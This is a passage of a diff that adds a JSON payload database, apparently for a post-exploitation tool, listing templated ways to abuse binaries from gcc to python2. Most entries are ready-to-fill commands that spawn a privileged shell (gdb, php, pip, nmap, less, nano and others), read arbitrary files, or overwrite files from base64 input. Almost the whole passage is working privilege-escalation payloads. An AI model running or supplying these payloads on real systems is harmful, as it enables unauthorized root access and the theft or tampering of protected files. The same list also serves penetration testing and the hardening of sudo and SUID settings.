+        "'BEGIN {{ printf \"\" > LFILE; while (getline > 0){{ print >> LFILE; }} }}'"
+      ],
+      "exit": "{ctrl_d}"
+    }
+  ],
+  "gcc": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-wrapper",
+        "{shell},-p,-s",
+        "."
+      ]
+    }
+  ],
+  "gdb": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "-nx",
+        "-ex",
+        "'!{shell} -p'",
+        "-ex",
+        "quit"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "-nx",
+        "-ex",
+        "'python import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'",
+        "-ex",
+        "quit"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "-nx",
+        "-ex",
+        "'set height 0'",
+        "-ex",
+        "'python print(open(\"{lfile}\").read())'",
+        "-ex",
+        "quit"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "-nx",
+        "-ex",
+        "'python import sys; open(\"{lfile}\",\"w\").write(sys.stdin.read())'",
+        "-ex",
+        "quit"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-q",
+        "-nx",
+        "-ex",
+        "'python import sys,base64; exec(\"\"\"with open(\"{lfile}\",\"wb\") as f:\\n\\tfor line in sys.stdin:\\n\\t\\tf.write(base64.b64decode(line.strip()))\"\"\")'",
+        "-ex",
+        "quit"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "gem": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "open",
+        "-e",
+        "'{shell} -c {shell} -p'",
+        "rdoc"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "open",
+        "-e",
+        "'{cat} {lfile}'",
+        "rdoc"
+      ]
+    }
+  ],
+  "genisoimage": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} -q -o - {lfile} | {tail} -c +49152",
+      "args": []
+    }
+  ],
+  "gimp-2.8": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-idf",
+        "--batch-interpreter=python-fu-eval",
+        "-b",
+        "'import os, pty;exec(\"try:\\n\\tos.setuid(0);\\nexcept:\\n\\tpass\\ntry:\\n\\tos.setgid(0)\\nexcept:\\n\\tpass\"); pty.spawn(\"{shell}\");gimp.exit()'"
+      ],
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "-idf",
+        "--batch-interpreter=python-fu-eval",
+        "-b",
+        "'import sys; sys.stdout.write(open(\"{lfile}\",\"rb\").read());gimp.exit()'"
+      ]
+    }
+  ],
+  "gimp": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-idf",
+        "--batch-interpreter=python-fu-eval",
+        "-b",
+        "'import os; os.system(\"{shell} -p\");gimp.exit()'"
+      ],
+      "exit": "exit"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 2>/dev/null",
+      "args": [
+        "-idf",
+        "--batch-interpreter=python-fu-eval",
+        "-b",
+        "'import sys; sys.stdout.write(open(\"{lfile}\",\"rb\").read());gimp.exit()'"
+      ]
+    }
+  ],
+  "git": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "help",
+        "config"
+      ],
+      "input": "!{shell}\n",
+      "exit": "exit\nq\n"
+    }
+  ],
+  "grep": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "''",
+        "{lfile}"
+      ]
+    }
+  ],
+  "gtester": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo '#!{shell} -p' > $TF; echo 'exec {shell} -p 0<&1' >> $TF; {chmod} +x $TF; {command}; rm -f $TF",
+      "args": [
+        "-q",
+        "$TF"
+      ]
+    }
+  ],
+  "head": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c1GB",
+        "{lfile}"
+      ]
+    }
+  ],
+  "highlight": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "--no-doc",
+        "--failsafe",
+        "{lfile}"
+      ]
+    }
+  ],
+  "iconv": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-f",
+        "8859_1",
+        "-t",
+        "8859_1",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{base64} -d | {command}",
+      "args": [
+        "-f",
+        "8859_1",
+        "-t",
+        "8859_1",
+        "-o",
+        "{lfile}"
+      ]
+    }
+  ],
+  "ionice": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ip": [
+    {
+      "type": "shell",
+      "payload": "{command} netns add foo; {command} netns exec foo {shell} -p && {command} netns delete foo",
+      "args": [],
+      "exit": "exit\n{ip} netns delete foo\n"
+    }
+  ],
+  "irb": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "irb2.5": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'exec \"{shell} -p\"' > $TF; {command}",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'puts File.read(\"{lfile}\")' > $TF; {command} | {head} -n -2 | {tail} -n +2 | {head} -c -1",
+      "args": [
+        "$TF"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "print",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp}); echo 'File.open(\"{lfile}\", \"w+\") {{ |f| f.write(ARGF.read) }}' > $TF; {base64} -d | {command}",
+      "args": [
+        "$TF"
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "jjs": [
+    {
+      "type": "shell",
+      "payload": "echo \"Java.type('java.lang.Runtime').getRuntime().exec('{shell} -pc \\$@|sh\\${{IFS}}-p _ echo {shell} -p <$({tty}) >$({tty}) 2>$({tty})').waitFor()\" | {command}",
+      "args": [
+        ""
+      ]
+    }
+  ],
+  "journalctl": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "!{shell} -p\n",
+      "exit": "exit\n{ctrl_c}"
+    }
+  ],
+  "jq": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-Rr",
+        ".",
+        "{lfile}"
+      ]
+    }
+  ],
+  "jrunscript": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-e",
+        "\"exec('/bin/sh -pc \\$@|sh\\${{IFS}}-p _ echo /bin/bash -p <$({tty}) >$({tty}) 2>$({tty})')\""
+      ]
+    }
+  ],
+  "ksh": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "suid": [
+        "-p"
+      ],
+      "input": "{shell} -p\n",
+      "exit": "exit\nexit\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{cat} {lfile}\""
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{base64} -d > {lfile}\""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "ksh93": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "suid": [
+        "-p"
+      ],
+      "input": "{shell} -p\n",
+      "exit": "exit\nexit\n"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{cat} {lfile}\""
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "\"{base64} -d > {lfile}\""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "ld-linux-x86-64.so.2": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-linux-x86-64.so.1": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-linux-x86.so.2": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-linux-x86.so.1": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-linux.so.1": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-linux.so.2": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld.so.2": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld.so.1": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld.so": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-2.so": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "ld-2.30.so": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p"
+      ]
+    }
+  ],
+  "less": [
+    {
+      "type": "shell",
+      "payload": "{command} /etc/profile",
+      "input": "!{shell} -p\n\n",
+      "exit": "exit\nq"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} | {cat}",
+      "args": [
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{command} /etc/hosts; TF=$({mktemp} -u); {base64} -d > $TF; {command} < $TF; {rm} -f $TF",
+      "input": "q",
+      "exit": "{ctrl_d}{ctrl_d}s{lfile}\nq\n"
+    }
+  ],
+  "logsave": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "/dev/null",
+        "{shell}",
+        "-i",
+        "-p",
+        "-c",
+        "\"exec {shell} -p <$({tty}) >$({tty}) 2>$({tty})\""
+      ]
+    }
+  ],
+  "look": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command}",
+      "args": [
+        "''",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} | {head} -c -1",
+      "args": [
+        "''",
+        "{lfile}"
+      ]
+    }
+  ],
+  "ltrace": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-b",
+        "-L",
+        "{shell} -p"
+      ]
+    }
+  ],
+  "lwp-request": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "file://{lfile}"
+      ]
+    }
+  ],
+  "mail": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "--exec='!{shell}'"
+      ]
+    }
+  ],
+  "make": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-s",
+        "--eval=$'x:\\n\\t-'\"{shell} -p\""
+      ]
+    }
+  ],
+  "man": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "man"
+      ],
+      "input": "!{shell}\n",
+      "exit": "exit\nq"
+    }
+  ],
+  "mawk": [
+    {
+      "type": "shell",
+      "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} // {lfile}"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+    }
+  ],
+  "more": [
+    {
+      "type": "shell",
+      "payload": "TERM= {command} /etc/passwd",
+      "input": "!{shell}",
+      "exit": "exit\nq"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} {lfile} | {cat}"
+    }
+  ],
+  "mtr": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} | | while read line; do echo ${line:28:-27}; done",
+      "args": [
+        "--raw",
+        "-F",
+        "{lfile}"
+      ]
+    }
+  ],
+  "mv": [
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -u); {base64} -d > $TF; {command}; {rm} -f $TF",
+      "args": [
+        "$TF",
+        "{lfile}"
+      ]
+    }
+  ],
+  "nano": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n",
+      "exit": "exit\n{ctrl_x}n"
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-s",
+        "'{shell} -p'"
+      ],
+      "input": "{shell} -p\n{ctrl_t}",
+      "exit": "exit\n{ctrl_x}n"
+    },
+    {
+      "type": "shell",
+      "payload": "SPELL='{shell} -p' {command}",
+      "args": [],
+      "input": "{shell} -p\n{ctrl_t}",
+      "exit": "exit\n{ctrl_x}n"
+    }
+  ],
+  "nawk": [
+    {
+      "type": "shell",
+      "payload": "{command} 'BEGIN {{system(\"{shell} -p\")}}'"
+    },
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} // {lfile}"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} 'BEGIN {{system(\"{cat} {lfile}\")}}'"
+    }
+  ],
+  "nice": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell} -p"
+      ]
+    }
+  ],
+  "nl": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "{command} | while read line; do echo $line; done",
+      "args": [
+        "-bn",
+        "-w1",
+        "-s",
+        "''",
+        "{lfile}"
+      ]
+    }
+  ],
+  "nmap": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp}); echo 'os.execute(\"{shell} -p\")' > $TF; {command}; {rm} -f $TF",
+      "input": "reset\n",
+      "args": [
+        "--script=$TF"
+      ]
+    }
+  ],
+  "node": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-e",
+        "'require(\"child_process\").spawn(\"{shell}\", [\"-p\"], {{stdio: [0, 1, 2]}});'"
+      ]
+    }
+  ],
+  "nohup": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell}",
+        "-p",
+        "-c",
+        "\"{shell} -p  <$({tty}) >$({tty}) 2>$({tty})\""
+      ]
+    }
+  ],
+  "nroff": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -d); echo '#!{shell} -p' > $TF/groff; echo '{shell} -p' >> $TF/groff; chmod +x $TF/groff; GROFF_BIN_PATH=$TF {command}",
+      "args": []
+    }
+  ],
+  "nsenter": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "{shell} -p"
+      ]
+    }
+  ],
+  "od": [
+    {
+      "type": "read",
+      "stream": "print",
+      "payload": "echo -e $({command} -An -c -w9999 {lfile} | {sed} \"s/   /\\n/g\" | {tr} -d \"\\n\") | {head} -n -1",
+      "args": [
+        ""
+      ]
+    }
+  ],
+  "openssl": [
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "enc",
+        "-in",
+        "{lfile}"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "{base64} -d | {command}",
+      "args": [
+        "enc",
+        "-out",
+        "{lfile}"
+      ]
+    }
+  ],
+  "pdb": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -u); echo 'import os; os.system(\"{shell} -p\"); exit(0)' > $TF; {command}; {rm} -f $TF",
+      "args": [
+        "$TF"
+      ],
+      "input": "cont\n"
+    }
+  ],
+  "perl": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-e",
+        "'exec \"{shell} -p\"'"
+      ]
+    }
+  ],
+  "pg": [
+    {
+      "type": "shell",
+      "payload": "{command} /etc/profile",
+      "input": "!{shell} -p\n\n",
+      "exit": "exit\nq"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} | {cat}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "pager": [
+    {
+      "type": "shell",
+      "payload": "{command} /etc/profile",
+      "input": "!{shell} -p\n\n",
+      "exit": "exit\nq"
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command} | {cat}",
+      "args": [
+        "{lfile}"
+      ]
+    }
+  ],
+  "php": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'system(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'passthru(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'echo(file_get_contents(\"{lfile}\"));'"
+      ]
+    }
+  ],
+  "php5": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'system(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'passthru(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'echo(file_get_contents(\"{lfile}\"));'"
+      ]
+    }
+  ],
+  "php7": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'system(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'passthru(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'echo(file_get_contents(\"{lfile}\"));'"
+      ]
+    }
+  ],
+  "php7.0": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'system(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'passthru(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'echo(file_get_contents(\"{lfile}\"));'"
+      ]
+    }
+  ],
+  "php7.3": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'system(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'passthru(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'shell_exec(\"{shell} -p 1>&0 2>&0\");'"
+      ]
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'$h=@popen(\"{shell} -p 1>&0 2>&0\",\"r\"); if($h){{ while(!feof($h)) echo(fread($h,4096)); pclose($h); }}'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-r",
+        "'echo(file_get_contents(\"{lfile}\"));'"
+      ]
+    }
+  ],
+  "pic": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-U"
+      ],
+      "input": ".PS\nsh X {shell} X\n",
+      "exit": "exit\n{ctrl_c}"
+    }
+  ],
+  "pico": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "input": "{ctrl_r}{ctrl_x}reset; {shell} -p 1>&0 2>&0\n",
+      "exit": "exit\n{ctrl_x}n"
+    },
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-s",
+        "'{shell} -p'"
+      ],
+      "input": "{shell} -p\n{ctrl_t}",
+      "exit": "exit\n{ctrl_x}n"
+    },
+    {
+      "type": "shell",
+      "payload": "SPELL='{shell} -p' {command}",
+      "args": [],
+      "input": "{shell} -p\n{ctrl_t}",
+      "exit": "exit\n{ctrl_x}n"
+    }
+  ],
+  "pip": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}",
+      "args": [
+        "install",
+        "$TF"
+      ]
+    }
+  ],
+  "pip3": [
+    {
+      "type": "shell",
+      "payload": "TF=$({mktemp} -d); echo \"import os; os.execl('{shell}', '{shell}', '-p', '-c', '{shell} -p <$({tty}) >$({tty}) 2>$({tty})')\" > $TF/setup.py; {command}",
+      "args": [
+        "install",
+        "$TF"
+      ]
+    }
+  ],
+  "pry": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "--exec",
+        "'system(\"{shell} -p\");exit'"
+      ]
+    }
+  ],
+  "python": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\nwith open('{lfile}','wb') as h:\\n\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\th.write(base64.b64decode(line.strip()))''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "python3.8": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "python3.7": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "python3.5": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "python3": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
+    }
+  ],
+  "python2": [
+    {
+      "type": "shell",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import os; os.execl(\"{shell}\", \"{shell}\", \"-p\")'"
+      ]
+    },
+    {
+      "type": "read",
+      "stream": "raw",
+      "payload": "{command}",
+      "args": [
+        "-c",
+        "'import sys, os; sys.stdout.buffer.write(open(\"{lfile}\", \"rb\").read())'"
+      ]
+    },
+    {
+      "type": "write",
+      "stream": "base64",
+      "payload": "TF=$({mktemp} -d); {cat} > $TF/b64; {command} -c \"exec('''import base64,os\\n\\ntry:\\n\\twith open('{lfile}','wb') as h:\\n\\t\\tfor line in open('$TF/b64', 'rb'):\\n\\t\\t\\th.write(base64.b64decode(line.strip()))\\nexcept:\\n\\twhile 1:\\n\\t\\tsys.stdin.read()''')\"; {rm} -f $TF/b64",
+      "args": [
+        ""
+      ],
+      "exit": "{ctrl_d}{ctrl_d}"
